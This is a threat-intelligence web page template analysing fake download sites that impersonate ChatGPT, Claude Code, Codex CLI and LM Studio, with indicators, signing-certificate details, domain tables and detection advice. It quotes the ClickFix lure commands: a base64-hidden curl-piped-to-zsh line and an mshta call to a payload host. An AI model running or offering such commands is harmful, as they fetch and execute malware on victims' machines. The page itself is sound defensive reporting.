---
layout: default
title: "Software Impersonation Infrastructure: Trend Analysis"
description: "Confirmed masquerading delivery infrastructure - favicon-pivot hunts, JS-gated EXE campaigns, ClickFix install modals, and developer-tool domain squats mapped through the Detection Chokepoint Framework."
permalink: /trends/masq-infra/
---

<style>
/* ── Page layout (matches ClickGrab / Edge Exploits) ───────────────────── */
.mi-page h1 { font-size: 1.6rem; font-weight: 700; margin-bottom: .25rem; } /* color: theme-arcade.css accent */
.mi-page h2 { font-size: 1.15rem; font-weight: 700; color: var(--text); margin: 2.5rem 0 .75rem; border-bottom: 1px solid transparent; border-image: linear-gradient(to right, var(--accent), var(--border) 35%, transparent) 1; padding-bottom: .4rem; }
.mi-page h3 { font-size: 1rem; font-weight: 600; color: var(--text); margin: 1.5rem 0 .5rem; }
.mi-page p, .mi-page li { color: var(--text-muted); font-size: .9rem; line-height: 1.7; }
.mi-page a { color: var(--link); }
.mi-meta { color: var(--text-muted); font-size: .8rem; margin-bottom: 1.75rem; }

.mi-stats { display: flex; gap: 1rem; flex-wrap: wrap; margin: 1.25rem 0 2rem; }
.mi-stat { flex: 1 1 140px; background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: .85rem 1rem; box-shadow: 0 4px 16px rgba(0,0,0,0.25), inset 0 1px 0 rgba(255,255,255,0.04); }
.mi-stat-val { font-size: 1.85rem; font-weight: 700; color: var(--text); font-family: ui-monospace, monospace; line-height: 1.2; }
.mi-stat-lbl { font-size: .72rem; color: var(--text-muted); margin-top: .2rem; text-transform: uppercase; letter-spacing: .04em; }

.mi-chain { display: flex; align-items: flex-start; gap: 0; flex-wrap: wrap; margin: 1.5rem 0 2rem; }
.mi-chain-stage { flex: 1 1 90px; min-width: 80px; border: 1px solid var(--border); border-radius: 6px; padding: .6rem .5rem; text-align: center; background: var(--bg-card); position: relative; }
.mi-chain-stage + .mi-chain-stage { margin-left: -1px; border-radius: 0; }
.mi-chain-stage:first-child { border-radius: 6px 0 0 6px; }
.mi-chain-stage:last-child { border-radius: 0 6px 6px 0; }
.mi-chain-stage--blind { border-top: 3px solid var(--border); }
.mi-chain-stage--t1 { border-top: 3px solid var(--high); box-shadow: inset 0 3px 10px -5px rgba(227,179,65,0.4); }
.mi-chain-stage--t2 { border-top: 3px solid var(--accent); box-shadow: inset 0 3px 10px -5px rgba(240,136,62,0.4); }
.mi-chain-stage--t3 { border-top: 3px solid var(--critical); box-shadow: inset 0 3px 10px -5px rgba(218,54,51,0.4); }
.mi-chain-label { font-size: .72rem; font-weight: 600; color: var(--text); line-height: 1.3; display: block; }
.mi-chain-sub { font-size: .62rem; color: var(--text-muted); margin-top: .25rem; display: block; }
.mi-tier-badge { display: inline-block; font-size: .6rem; font-weight: 700; padding: .1rem .35rem; border-radius: 3px; margin-top: .35rem; letter-spacing: .03em; }
.mi-tier-blind { background: var(--bg-input); color: var(--text-muted); }
.mi-tier-t1 { background: rgba(227,179,65,.15); color: var(--high); }
.mi-tier-t2 { background: rgba(240,136,62,.15); color: var(--accent); }
.mi-tier-t3 { background: rgba(218,54,51,.15); color: var(--critical); }
.mi-chain-arrow { align-self: center; flex: 0 0 auto; color: var(--border); font-size: 1.2rem; padding: 0 .1rem; margin-top: -2px; }

.mi-callout { border-radius: 6px; padding: .85rem 1rem; margin: .75rem 0; font-size: .875rem; border-left: 3px solid; }
.mi-callout--warn { background: rgba(227,179,65,.08); border-color: var(--high); color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(227,179,65,0.35); }
.mi-callout--alert { background: rgba(218,54,51,.08); border-color: var(--critical); color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(218,54,51,0.35); }
.mi-callout--info { background: rgba(56,139,253,.08); border-color: var(--low); color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(56,139,253,0.35); }
.mi-callout--tip { background: rgba(63,185,80,.08); border-color: var(--medium); color: var(--text); box-shadow: inset 3px 0 12px -5px rgba(63,185,80,0.35); }
.mi-callout strong { color: var(--text); }

.mi-table { width: 100%; border-collapse: collapse; font-size: .85rem; margin: .75rem 0 1.5rem; }
.mi-table th { text-align: left; color: var(--text-muted); font-size: .72rem; text-transform: uppercase; letter-spacing: .04em; border-bottom: 1px solid var(--border); padding: .4rem .6rem; font-weight: 600; }
.mi-table td { padding: .45rem .6rem; border-bottom: 1px solid var(--border); color: var(--text); font-size: .82rem; vertical-align: top; }
.mi-table tr:hover td { background: rgba(255,255,255,0.02); }
.mi-table .mono { font-family: ui-monospace, monospace; }
.mi-table .muted { color: var(--text-muted); }

.mi-methodology { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid var(--accent); border-radius: 6px; padding: .75rem 1rem; margin: 1rem 0 1.5rem; font-size: .82rem; color: var(--text-muted); }

.mi-class-stealer, .mi-class-c2, .mi-class-rmm, .mi-class-loader, .mi-class-unknown {
  font-size: .72rem; font-weight: 600; padding: .15rem .5rem; border-radius: 3px;
  font-family: monospace; text-transform: uppercase; letter-spacing: .04em; white-space: nowrap;
}
.mi-class-stealer { background: #ef444420; color: #ef4444; border: 1px solid #ef444440; }
.mi-class-c2 { background: #f9731620; color: #f97316; border: 1px solid #f9731640; }
.mi-class-rmm { background: #8b5cf620; color: #8b5cf6; border: 1px solid #8b5cf640; }
.mi-class-loader { background: #06b6d420; color: #06b6d4; border: 1px solid #06b6d440; }
.mi-class-unknown { background: #6b728020; color: #6b7280; border: 1px solid #6b728040; }

.mi-campaign-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 1rem; }
.mi-campaign-title { font-weight: 700; color: var(--text); font-size: .95rem; margin-bottom: .35rem; }
.mi-campaign-meta { display: flex; gap: .75rem; flex-wrap: wrap; font-size: .78rem; color: var(--text-muted); margin-bottom: .5rem; }
.mi-tag { display: inline-block; font-size: .65rem; font-weight: 700; padding: .15rem .4rem; border-radius: 3px; letter-spacing: .03em; margin-right: .25rem; }
.mi-tag-live { background: rgba(63,185,80,.15); color: #3fb950; }
.mi-tag-survey { background: rgba(107,114,128,.15); color: var(--text-muted); }

.mi-bar-wrap { display: flex; align-items: center; gap: .75rem; margin: .35rem 0; }
.mi-bar { height: 18px; border-radius: 3px; min-width: 4px; background: var(--accent); opacity: .65; }
.mi-bar-label { font-size: .78rem; color: var(--text-muted); min-width: 160px; }
.mi-bar-count { font-size: .78rem; color: var(--text-muted); font-family: monospace; }

.mi-chain-notice { background: var(--bg-card); border: 1px solid var(--border); border-left: 3px solid #6b7280; border-radius: 6px; padding: .75rem 1rem; font-size: .82rem; color: var(--text-muted); margin: .75rem 0; }

.logic-block { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; font-family: ui-monospace, monospace; font-size: .78rem; line-height: 1.6; }

.det-rec { background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; margin: 1rem 0; overflow: hidden; }
.det-rec-header { display: flex; align-items: flex-start; gap: 0.8rem; padding: 1rem 1.2rem; }
.det-rec-tier { font-family: var(--font-mono); font-size: 0.65rem; font-weight: 700; letter-spacing: 0.08em; padding: 3px 10px; border-radius: 3px; white-space: nowrap; margin-top: 2px; flex-shrink: 0; }
.det-rec-title { font-weight: 600; color: var(--text); font-size: 0.92rem; line-height: 1.4; }
.det-rec-desc { color: var(--text-muted); font-size: 0.85rem; margin-top: 0.3rem; line-height: 1.5; }
.det-rec details { padding: 0 1.2rem; margin: 0; }
.det-rec details[open] { padding-bottom: 1rem; }
.det-rec summary { font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted); cursor: pointer; margin: 0; padding: 0.5rem 0; list-style: none; display: flex; align-items: center; gap: 0.4rem; }
.det-rec summary::-webkit-details-marker { display: none; }
.det-rec summary::before { content: "›"; color: var(--text-dim); transition: transform .15s; }
details[open] > summary::before { transform: rotate(90deg); }
details[open] > summary { margin-bottom: 0.4rem; }
.tier-1 { background: rgba(218,54,51,0.15); color: var(--critical); }
.tier-2 { background: rgba(240,136,62,0.15); color: var(--accent); }
.tier-na { background: rgba(107,114,128,0.15); color: var(--text-muted); }
.mi-payload-example { background: var(--bg-code); border: 1px solid var(--border); border-radius: 6px; padding: .75rem 1rem; margin: .5rem 0; overflow-x: auto; font-size: .78rem; }

.trends-layout { display: flex; gap: 2rem; max-width: 1100px; margin: 0 auto; padding: 2rem 1.5rem 4rem; }
.trends-sidebar { width: 160px; flex-shrink: 0; position: sticky; top: 5rem; align-self: flex-start; height: fit-content; padding: 1rem 0; }
.trends-sidebar ul { list-style: none; padding: 0; margin: 0; }
.trends-sidebar li { margin: 0; }
.trends-sidebar a { display: block; font-family: var(--font-mono, ui-monospace, monospace); font-size: .73rem; color: var(--text-dim, #484f58); padding: .35rem .75rem; text-decoration: none; border-left: 2px solid transparent; border-radius: 0 3px 3px 0; transition: color .15s, border-color .15s, background .15s; }
.trends-sidebar a:hover { color: var(--text-muted); text-decoration: none; background: rgba(255,255,255,0.025); }
.trends-sidebar a.active { color: var(--text, #c9d1d9); font-weight: 500; border-left: 3px solid var(--accent, #f0883e); box-shadow: inset 3px 0 8px -4px rgba(240,136,62,0.4); background: rgba(240,136,62,0.07); }
.trends-content { flex: 1; min-width: 0; }

@media (max-width: 900px) {
  .trends-layout { flex-direction: column; padding: 2rem 1rem 4rem; }
  .trends-sidebar { position: fixed; bottom: 0; left: 0; right: 0; width: 100%; top: auto; align-self: auto; background: rgba(13,17,23,0.92); backdrop-filter: blur(8px); border-top: 1px solid var(--border); padding: .5rem 0; z-index: 100; }
  .trends-sidebar ul { display: flex; gap: 0; justify-content: space-around; width: 100%; overflow-x: auto; }
  .trends-sidebar a { border-left: none; border-bottom: 2px solid transparent; padding: .3rem .45rem; font-size: .58rem; text-align: center; white-space: nowrap; }
  .trends-sidebar a.active { border-bottom-color: var(--accent); border-left-color: transparent; }
  .trends-content { padding-bottom: 3.5rem; }
}
</style>

<div class="trends-layout">
<nav class="trends-sidebar" id="trends-nav">
  <ul>
    <li><a href="#overview" class="active">Overview</a></li>
    <li><a href="#framework">Framework</a></li>
    <li><a href="#campaigns">Campaigns</a></li>
    <li><a href="#chatgpt">ChatGPT</a></li>
    <li><a href="#claude">Claude Code</a></li>
    <li><a href="#codex">Codex CLI</a></li>
    <li><a href="#lmstudio">LM Studio</a></li>
    <li><a href="#operators">Operators</a></li>
    <li><a href="#pipeline-data">Pipeline</a></li>
    <li><a href="#detections">Detections</a></li>
  </ul>
</nav>

<div class="mi-page trends-content" id="overview">

<h1>Software Impersonation Infrastructure</h1>
<p class="mi-meta">
  Hunt data: de-intel-pipeline &nbsp;·&nbsp;
  Pipeline records: {{ site.data.masq_infra.meta.record_count | default: "-" }}
  {% if site.data.masq_infra_hunts %}
  &nbsp;·&nbsp; {{ site.data.masq_infra_hunts.meta.hunt_count }} validated hunts
  &nbsp;·&nbsp; {{ site.data.masq_infra_hunts.meta.date_range }}
  {% endif %}
  {% if site.data.masq_infra.meta.last_updated %}
  &nbsp;·&nbsp; Aggregate updated: {{ site.data.masq_infra.meta.last_updated }}
  {% endif %}
</p>

<div class="mi-methodology">
<strong>Data:</strong> Validated de-intel-pipeline hunts (URLScan/sandbox-cited) + aggregate IOC pipeline (MalwareBazaar, ThreatFox, URLScan), payload-hash confirmed.
</div>

<div class="mi-stats">
  {% if site.data.masq_infra_hunts %}
  <div class="mi-stat">
    <div class="mi-stat-val">{{ site.data.masq_infra_hunts.meta.hunt_count }}</div>
    <div class="mi-stat-lbl">Validated hunts</div>
  </div>
  <div class="mi-stat">
    <div class="mi-stat-val">{{ site.data.masq_infra_hunts.meta.brands_targeted | size }}</div>
    <div class="mi-stat-lbl">Brands targeted</div>
  </div>
  <div class="mi-stat">
    <div class="mi-stat-val">{{ site.data.masq_infra_hunts.meta.confirmed_delivery_count }}</div>
    <div class="mi-stat-lbl">Confirmed delivery</div>
  </div>
  {% endif %}
  {% if site.data.masq_infra.meta.record_count %}
  <div class="mi-stat">
    <div class="mi-stat-val">{{ site.data.masq_infra.meta.record_count }}</div>
    <div class="mi-stat-lbl">Pipeline records</div>
  </div>
  {% endif %}
  {% if site.data.masq_infra.payload_summary %}
  <div class="mi-stat">
    <div class="mi-stat-val">{{ site.data.masq_infra.payload_summary.top_families | size }}</div>
    <div class="mi-stat-lbl">Payload families</div>
  </div>
  {% endif %}
  {% if site.data.masq_infra.campaigns %}
  <div class="mi-stat">
    <div class="mi-stat-val">{{ site.data.masq_infra.campaigns | size }}</div>
    <div class="mi-stat-lbl">Pipeline campaigns</div>
  </div>
  {% endif %}
</div>

<!-- ── Framework ─────────────────────────────────────────────────────── -->
<h2 id="framework">Detection Chokepoint Framework</h2>
<p>Every masquerading delivery campaign follows the same chain. The brand changes. The lure page changes. The payload host rotates. But the prerequisites don't: the adversary must register infrastructure, build a convincing lure, stage a payload, and get the victim to execute something. Perfect visual impersonation neutralizes user-facing trust signals - your detection budget belongs at execution and infrastructure layers.</p>

<div class="mi-chain" role="list" aria-label="Masquerading delivery chain stages">
  <div class="mi-chain-stage mi-chain-stage--blind" role="listitem">
    <span class="mi-chain-label">Brand recon</span>
    <span class="mi-chain-sub">Favicon hash, title pivot</span>
    <span class="mi-tier-badge mi-tier-blind">T1595 RECON</span>
  </div>
  <span class="mi-chain-arrow" aria-hidden="true">›</span>
  <div class="mi-chain-stage mi-chain-stage--blind" role="listitem">
    <span class="mi-chain-label">Domain registration</span>
    <span class="mi-chain-sub">Squat, typosquat, co.com TLD</span>
    <span class="mi-tier-badge mi-tier-blind">T1583.001 DOMAINS</span>
  </div>
  <span class="mi-chain-arrow" aria-hidden="true">›</span>
  <div class="mi-chain-stage mi-chain-stage--blind" role="listitem">
    <span class="mi-chain-label">Lure page build</span>
    <span class="mi-chain-sub">Clone + stolen favicon/logo</span>
    <span class="mi-tier-badge mi-tier-blind">T1036.005 MASQ</span>
  </div>
  <span class="mi-chain-arrow" aria-hidden="true">›</span>
  <div class="mi-chain-stage mi-chain-stage--t1" role="listitem">
    <span class="mi-chain-label">Payload staging</span>
    <span class="mi-chain-sub">CDN, BunnyCDN, HTA host</span>
    <span class="mi-tier-badge mi-tier-t1">T1608.001 STAGE</span>
  </div>
  <span class="mi-chain-arrow" aria-hidden="true">›</span>
  <div class="mi-chain-stage mi-chain-stage--t1" role="listitem">
    <span class="mi-chain-label">Delivery gate</span>
    <span class="mi-chain-sub">JS click, UA filter, modal</span>
    <span class="mi-tier-badge mi-tier-t1">T1566.002 PHISH</span>
  </div>
  <span class="mi-chain-arrow" aria-hidden="true">›</span>
  <div class="mi-chain-stage mi-chain-stage--t3" role="listitem">
    <span class="mi-chain-label">User execution</span>
    <span class="mi-chain-sub">EXE, mshta, curl|zsh</span>
    <span class="mi-tier-badge mi-tier-t3">T1204.002 EXEC</span>
  </div>
</div>

<div class="mi-callout mi-callout--info">
  <strong>Stages 1–3 are largely blind to endpoint detection.</strong> Favicon pivots and domain registration happen off-network. The lure page looks identical to the real product. Detection compounds at payload staging (network/DNS), delivery gate (proxy/IOK), and user execution (EDR/Sigma). A detection that fires only on the domain name breaks when the operator rotates hosting; one that fires on signed-binary-from-Downloads survives the rotation.
</div>

{% if site.data.masq_infra_hunts.infra_patterns.size > 0 %}
<h3>Infrastructure Patterns Across Hunts</h3>
{% assign max_pat = site.data.masq_infra_hunts.infra_patterns.first.hunt_count | default: 1 %}
{% for pat in site.data.masq_infra_hunts.infra_patterns %}
{% assign bar_w = pat.hunt_count | times: 200 | divided_by: max_pat %}
<div class="mi-bar-wrap">
  <span class="mi-bar-label">{{ pat.pattern }}</span>
  <div class="mi-bar" style="width:{{ bar_w }}px"></div>
  <span class="mi-bar-count">{{ pat.hunt_count }}/{{ site.data.masq_infra_hunts.meta.hunt_count }}</span>
</div>
{% endfor %}
{% endif %}

<!-- ── Campaign overview ─────────────────────────────────────────────── -->
<h2 id="campaigns">Active Campaigns (Hunt Intelligence)</h2>
<p>Validated hunts from the de-intel-pipeline. Each object passed schema, citation, and source-diversity validation before promotion to <code>hunts/</code>.</p>

{% if site.data.masq_infra_hunts.campaigns.size > 0 %}
{% for camp in site.data.masq_infra_hunts.campaigns %}
<div class="mi-campaign-card">
  <div class="mi-campaign-title">{{ camp.brand }}</div>
  <div class="mi-campaign-meta">
    <span>{{ camp.date_start }} → {{ camp.date_end }}</span>
    <span>{{ camp.ioc_count }} IOCs</span>
    <span>{{ camp.ttp_count }} TTPs</span>
    {% if camp.confirmed_delivery %}
    <span class="mi-tag mi-tag-live">CONFIRMED DELIVERY</span>
    {% else %}
    <span class="mi-tag mi-tag-survey">SURVEY / SQUAT</span>
    {% endif %}
  </div>
  <p style="margin:0;font-size:.85rem;color:var(--text-muted)">
    <strong style="color:var(--text)">{{ camp.threat_name }}</strong> -
    {% for method in camp.delivery_methods %}{{ method }}{% unless forloop.last %}, {% endunless %}{% endfor %}
  </p>
  {% if camp.domains.size > 0 %}
  <p style="margin:.5rem 0 0;font-size:.78rem;font-family:monospace;color:var(--text-muted)">
    {% for d in camp.domains limit:4 %}<code>{{ d }}</code>{% unless forloop.last %} · {% endunless %}{% endfor %}
  </p>
  {% endif %}
</div>
{% endfor %}

{% if site.data.masq_infra_hunts.brand_matrix.size > 0 %}
<h3>Brand Impersonation Matrix</h3>
<table class="mi-table">
  <thead><tr><th>Brand</th><th>Campaigns</th><th>Delivery methods</th><th>Confirmed delivery</th></tr></thead>
  <tbody>
    {% for row in site.data.masq_infra_hunts.brand_matrix %}
    <tr>
      <td><strong>{{ row.brand }}</strong></td>
      <td class="muted">{{ row.campaign_count }}</td>
      <td class="muted">{% for m in row.delivery_methods %}{{ m }}{% unless forloop.last %}; {% endunless %}{% endfor %}</td>
      <td>{% if row.confirmed_delivery %}<span style="color:#22c55e">Yes</span>{% else %}<span class="muted">No</span>{% endif %}</td>
    </tr>
    {% endfor %}
  </tbody>
</table>
{% endif %}
{% else %}
<div class="mi-chain-notice">No hunt data loaded. Run <code>python scripts/transform_intel_hunts.py</code> to generate <code>_data/masq_infra_hunts.yml</code>.</div>
{% endif %}

<!-- ── ChatGPT / MROScanner ──────────────────────────────────────────── -->
<h2 id="chatgpt">ChatGPT Impersonation - MROScanner OU Installer</h2>
<p>A fake "ChatGPT for Windows" download page (<code>chatgpt-windows.com</code>) on Oracle Cloud serves a 2.3 MB Inno Setup installer signed by Estonian shell company <code>MROScanner OU</code>. Download is JS-gated - no static link in HTML - with Windows-only UA fingerprinting and per-visitor affiliate tracking via a PHP backend. Payload staged on BunnyCDN.</p>

<pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code>POST /init/tracking.php
→ returns per-visitor URL: https://app-cg.b-cdn.net/ChatGPT_Installer.exe?hash=&lt;token&gt;

ChatGPT_Installer.exe
SHA-256: 17dc646d645252196a19e87752fa21dbe7b626cd71a9dacddebd9a2ed8f1e16e
Signer: MROScanner OU (SSL.com, thumbprint E3B6CF11...)</code></pre>

<div class="mi-callout mi-callout--alert">
  <strong>The cert is the stickiest signal.</strong> MROScanner OU + thumbprint <code>E3B6CF11...</code> appears on every binary this operator signs until revocation (valid until April 2027). The domain rotates. The CDN bucket name rotates. The cert thumbprint does not. Monitor VT/Hunt.io for new hits on this signer.
</div>

<div class="mi-callout mi-callout--warn">
  <strong>JS-only download gate defeats static scanners.</strong> URLScan sees a blank download page. The payload URL surfaces only after JavaScript executes a POST to <code>/init/tracking.php</code>. Non-Windows user-agents get "Unsupported System" - further reducing scanner noise and narrowing the victim pool to paid malvertising traffic (UTM params: <code>fbclid</code>, <code>bid</code>, <code>tid</code>).
</div>

<table class="mi-table">
  <thead><tr><th>Signal</th><th>Durability</th><th>Notes</th></tr></thead>
  <tbody>
    <tr><td class="mono">chatgpt-windows.com</td><td>Medium</td><td class="muted">3-year squatter history; repurposed May 2026</td></tr>
    <tr><td class="mono">app-cg.b-cdn.net</td><td>Low</td><td class="muted">CDN bucket - hash the binary when sandbox completes</td></tr>
    <tr><td class="mono">MROScanner OU cert</td><td>High</td><td class="muted">Pivot on thumbprint across VT/Hunt.io</td></tr>
    <tr><td class="mono">/init/tracking.php</td><td>Medium</td><td class="muted">Same PHP structure links sibling campaigns</td></tr>
  </tbody>
</table>

<!-- ── Claude Code ClickFix ──────────────────────────────────────────── -->
<h2 id="claude">Claude Code - ClickFix Install Modal</h2>
<p>Three fake "Download Claude" pages clone claude.com and present a fake install modal. Mac victims run a base64-concealed <code>curl | zsh</code> command; Windows victims run <code>mshta https://download.version-516.com/claude</code>. The kit predates Claude targeting - <code>/other</code> path was active 12 days before <code>/claude</code>.</p>

<pre class="logic-block rounded-lg p-4 overflow-x-auto text-[.8rem]"><code># Mac - social cover echo, then malicious curl
echo "Downloading Claude: https://claude.ai/install.sh" && curl -s $(echo '&lt;base64&gt;' | openssl base64 -d -A) | zsh

# Windows - HTA via signed LOLBin
mshta https://download.version-516.com/claude</code></pre>

<div class="mi-callout mi-callout--alert">
  <strong>Different delivery model - no file on disk for the primary vector.</strong> Paste-to-run bypasses SmartScreen entirely. The victim opens a terminal, reads a command that looks like official Anthropic install docs, and executes it. Cross-platform delivery (Mac + Windows) from the same kit with per-site payload domain rotation (<code>xprssit.com</code> vs <code>ewabeniak.com</code>).
</div>

<div class="mi-callout mi-callout--info">
  <strong>Real Anthropic analytics loaded on every visit.</strong> Clone pages load Segment, Amplitude, and <code>claude-custom-tracking.js</code> from <code>www.anthropic.com</code>. Victim traffic blends into legitimate claude.com analytics noise - a subtle signal worth monitoring if you correlate page views with actual installs.
</div>

<table class="mi-table">
  <thead><tr><th>Domain</th><th>Role</th></tr></thead>
  <tbody>
    <tr><td class="mono">uneifoifow-3ndfskq.pages.dev</td><td class="muted">Cloudflare Pages lure; Mac payload via xprssit.com</td></tr>
    <tr><td class="mono">too.clawddddd.com</td><td class="muted">Typosquat lure; Mac payload via ewabeniak.com</td></tr>
    <tr><td class="mono">download.version-516.com</td><td class="muted">Shared Windows HTA host (/claude, /other)</td></tr>
    <tr><td class="mono">xprssit.com / ewabeniak.com</td><td class="muted">Per-site Mac shell script delivery (/curl/&lt;hash&gt;)</td></tr>
  </tbody>
</table>

<!-- ── Codex CLI ─────────────────────────────────────────────────────── -->
<h2 id="codex">OpenAI Codex CLI - Domain Squatting</h2>
<p>Multiple domains registered within weeks of the Codex CLI public launch (April 2026) squat the exact product name. No confirmed binary delivery - credential harvest and SEO poisoning targeting developers who search for install instructions instead of using <code>npm install -g @openai/codex</code>.</p>

<div class="mi-callout mi-callout--warn">
  <strong>Developer tool distribution shifts the attack surface.</strong> CLI tools distributed via npm/GitHub have no downloadable installer page - favicon hash pivots don't apply when Cloudflare bot-protects openai.com. Adversaries pivot to title-based and domain-pattern queries. Watch for ClickFix paste-to-run pages appearing on these domains - the Claude Code hunt found the same pattern on Cloudflare Pages sites with similar domain age profiles.
</div>

<table class="mi-table">
  <thead><tr><th>Domain</th><th>Status</th><th>Pattern</th></tr></thead>
  <tbody>
    <tr><td class="mono">codex-cli.org</td><td class="muted">Phishing-tagged; dormant empty HTML</td><td>Squats npm package name</td></tr>
    <tr><td class="mono">codexhub.click</td><td class="muted">Vietnamese Codex CLI page + /login</td><td>Credential harvest suspected</td></tr>
    <tr><td class="mono">codexcli.homes</td><td class="muted">SSL cipher mismatch - conditional serving</td><td>Geo/IP gated content</td></tr>
    <tr><td class="mono">codexcli.gr.com</td><td class="muted">404 at scan time</td><td>Dormant squat infrastructure</td></tr>
  </tbody>
</table>

<!-- ── LM Studio ───────────────────────────────────────────────────────── -->
<h2 id="lmstudio">LM Studio - API Endpoint Impersonation</h2>
<p><code>lmstudio.co.com</code> redirects to <code>www.api.lmstudio.co.com</code>, impersonating the LM Studio local API server (normally <code>localhost:1234</code>). No installer delivery - threat is prompt exfiltration or API key theft via a misconfigured client endpoint string.</p>

<div class="mi-callout mi-callout--tip">
  <strong>The supply chain of developer tooling config.</strong> A domain at <code>api.lmstudio.co.com</code> is indistinguishable from a legitimate remote LM Studio endpoint in a config string. Watch for this pattern on Ollama (<code>localhost:11434</code>), Jan.ai, AnythingLLM. DNS was pulled by May 11, 2026 after community phishing reports.
</div>

<!-- ── Notion (brief) ──────────────────────────────────────────────────── -->
<h3 id="notion">Notion Coverage Survey</h3>
<p>Favicon pivot for Notion returned 5,692 non-Notion hits - structurally too noisy because Notion is used as a CMS backend by thousands of legitimate sites. No active Windows/Mac delivery campaign detected in the last 90 days. Only finding: <code>notiondownload.com</code> (Android APK squatter, Hostinger).</p>

<div class="mi-callout mi-callout--info">
  <strong>Not every brand is pivot-able.</strong> Heavily embedded brands (Notion, Google Docs) copy favicons verbatim across legitimate third-party sites. File-type narrowing (<code>filename:*.exe</code>) requires a URLScan API key. Title pivots and domain-pattern queries are the fallback when favicon hash pivots produce unusable noise.
</div>

<!-- ── Operator comparison ─────────────────────────────────────────────── -->
<h2 id="operators">Cross-Campaign Operator Comparison</h2>
<p>Two distinct delivery philosophies emerged from the May 2026 hunt window - traditional EXE distribution vs. paste-to-run developer targeting.</p>

<table class="mi-table">
  <thead>
    <tr><th></th><th>MROScanner OU (ChatGPT)</th><th>ClickFix Install Modal (Claude)</th></tr>
  </thead>
  <tbody>
    <tr><td><strong>Delivery</strong></td><td class="muted">EXE download (JS-gated)</td><td class="muted">Paste-to-run command</td></tr>
    <tr><td><strong>File on disk</strong></td><td class="muted">Yes - Inno Setup installer</td><td class="muted">No file for primary vector</td></tr>
    <tr><td><strong>Code signing</strong></td><td class="muted">Shell-company Authenticode</td><td class="muted">Not applicable</td></tr>
    <tr><td><strong>OS targeting</strong></td><td class="muted">Windows only (UA filter)</td><td class="muted">Mac + Windows (separate commands)</td></tr>
    <tr><td><strong>Obfuscation</strong></td><td class="muted">BunnyCDN + per-visitor hash</td><td class="muted">Base64 URL in JS + domain rotation</td></tr>
    <tr><td><strong>Infrastructure</strong></td><td class="muted">Oracle Cloud dedicated VM</td><td class="muted">Cloudflare Pages (ephemeral)</td></tr>
    <tr><td><strong>Traffic model</strong></td><td class="muted">Paid malvertising (UTM tracking)</td><td class="muted">Real brand analytics loaded</td></tr>
    <tr><td><strong>Kit reuse</strong></td><td class="muted">Unknown</td><td class="muted">Confirmed multi-brand (/other path)</td></tr>
    <tr><td><strong>Sophistication</strong></td><td class="muted">Medium</td><td class="muted">Medium-high</td></tr>
  </tbody>
</table>

<div class="mi-callout mi-callout--warn">
  <strong>Two operators, same target demographic.</strong> Both campaigns impersonate AI developer tools released in 2025–2026. The EXE operator buys code signing certs and runs paid traffic. The ClickFix operator skips file download entirely and targets terminal-comfortable users. Your detection stack needs both paths: signed-binary-from-Downloads <em>and</em> unusual-parent → mshta/curl-from-terminal.
</div>

{% if site.data.masq_infra_hunts.ttp_summary.size > 0 %}
<h3>MITRE Technique Frequency (Hunts)</h3>
<table class="mi-table">
  <thead><tr><th>Technique</th><th>Label</th><th>Hunts</th></tr></thead>
  <tbody>
    {% for ttp in site.data.masq_infra_hunts.ttp_summary %}
    <tr>
      <td class="mono">{{ ttp.mitre_id }}</td>
      <td class="muted">{{ ttp.label }}</td>
      <td>{{ ttp.count }}</td>
    </tr>
    {% endfor %}
  </tbody>
</table>
{% endif %}

<!-- ── Pipeline aggregate data ───────────────────────────────────────── -->
<h2 id="pipeline-data">Aggregate Pipeline Data</h2>
<p>IOC-first pipeline records from confirmed payload reports and infrastructure hunts. Delivery chains shown only when URLScan captured the redirect sequence.</p>

{% if site.data.masq_infra.payload_summary %}
{% assign ps = site.data.masq_infra.payload_summary %}
<h3>Payload Class Breakdown</h3>
{% assign max_class = 1 %}
{% assign cb = ps.class_breakdown %}
{% for item in cb %}
  {% if item[1] > max_class %}
    {% assign max_class = item[1] %}
  {% endif %}
{% endfor %}
{% assign classes = "stealer,c2,rmm,loader,unknown" | split: "," %}
{% for cls in classes %}
{% assign cls_count = cb[cls] | default: 0 %}
{% assign bar_pct = cls_count | times: 100 | divided_by: max_class %}
<div class="mi-bar-wrap">
  <span class="mi-bar-label"><span class="mi-class-{{ cls }}">{{ cls }}</span></span>
  <div class="mi-bar" style="width:{{ bar_pct | times: 3 }}px;opacity:.8"></div>
  <span class="mi-bar-count">{{ cls_count }}</span>
</div>
{% endfor %}
{% endif %}

{% assign records = site.data.masq_infra.records %}
{% if records.size > 0 %}
<h3>Confirmed Delivery Domains (sample)</h3>
<table class="mi-table">
  <thead><tr><th>Domain</th><th>IP</th><th>Class</th><th>First seen</th></tr></thead>
  <tbody>
    {% assign sorted = records | sort: "last_seen" | reverse %}
    {% for rec in sorted limit:15 %}
    <tr>
      <td class="mono">{{ rec.domain }}</td>
      <td class="mono muted">{{ rec.ip | default: "-" }}</td>
      <td><span class="mi-class-{{ rec.payload_class }}">{{ rec.payload_class }}</span></td>
      <td class="muted">{{ rec.first_seen | date: "%Y-%m-%d" }}</td>
    </tr>
    {% endfor %}
  </tbody>
</table>
{% else %}
<div class="mi-chain-notice">Pipeline records sparse or schema misaligned. Run collection pipeline or Streamlit review app to refresh <code>_data/masq_infra.json</code>.</div>
{% endif %}

{% assign fav_clusters = site.data.masq_infra.infrastructure_summary.favicon_clusters %}
{% if fav_clusters.size > 0 %}
<h3>Favicon Clusters</h3>
<table class="mi-table">
  <thead><tr><th>Hash</th><th>Domains</th><th>Sample</th></tr></thead>
  <tbody>
    {% for fc in fav_clusters %}
    <tr>
      <td class="mono"><a href="https://www.shodan.io/search?query=http.favicon.hash:{{ fc.favicon_hash }}" target="_blank" rel="noopener">{{ fc.favicon_hash }}</a></td>
      <td>{{ fc.count }}</td>
      <td class="mono muted">{{ fc.sample_domain }}</td>
    </tr>
    {% endfor %}
  </tbody>
</table>
{% endif %}

{% if site.data.masq_infra_history %}
<h3>Weekly Volume</h3>
<div id="mi-chart-volume"></div>
